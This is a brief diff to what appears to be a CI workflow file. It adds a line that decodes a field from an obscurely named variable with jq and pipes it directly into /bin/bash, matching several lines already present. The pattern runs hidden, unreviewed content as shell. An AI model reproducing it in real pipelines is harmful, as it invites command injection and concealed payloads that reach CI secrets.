@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$ogig82085" | jq -r .b3916 | /bin/bash
           echo $bsv0669 | jq -r .yr2159 | /bin/bash
           printf '%s' "$p0202" | jq -r .mo97 | /bin/bash
+          printf '%s' "$xlgx2" | jq -r .anw4 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
